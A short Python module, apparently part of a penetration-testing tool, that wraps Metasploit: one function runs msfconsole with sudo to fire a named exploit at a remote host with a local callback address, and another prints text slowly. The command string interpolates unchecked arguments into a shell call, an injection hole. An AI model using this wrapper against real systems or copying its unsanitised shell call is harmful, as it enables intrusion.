import sys
import os
import time

def metasploit(exploit:str, rhost:str, lhost:str):
    # msfconsole -q -x " use exploit/multi/handler; set rhost $targetip;
    # set lport $lport ; explot -j;"

    return os.system(f'sudo msfconsole -q -x "use {exploit}; set rhost {rhost}; set lhost {lhost};run"')

def sprint(text:str):
    print("\033[1;37m")
    for i in str(text) + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.1)

